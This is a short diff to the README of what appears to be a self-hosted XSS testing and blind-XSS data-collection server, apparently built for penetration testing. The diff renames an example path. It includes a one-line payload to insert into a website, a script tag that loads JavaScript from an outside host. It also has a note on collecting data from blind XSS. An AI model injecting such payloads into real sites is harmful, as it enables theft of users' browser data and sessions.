@@ -40,8 +40,8 @@ This endpoint will contain response specified in `assets/extensions.json` file
   }
 ```   
 Insert this payload to the website, alert will popup.  
-`<script src=https://domain.com/examplepath.js></script>`  
-This endpoint use regex `examplepath.*` so you can use `examplepathanything/after/counts.html`  
+`<script src=https://domain.com/pichik.js></script>`  
+This endpoint use regex `pichik.*` so you can use `pichik-anything/after/counts.html`  
 
 ### Collecting data from blind XSS  
 You can use any endpoint for testing blind XSS, but dont use your collector path for this, as it have priority, so no blind XSS payload will be send.  
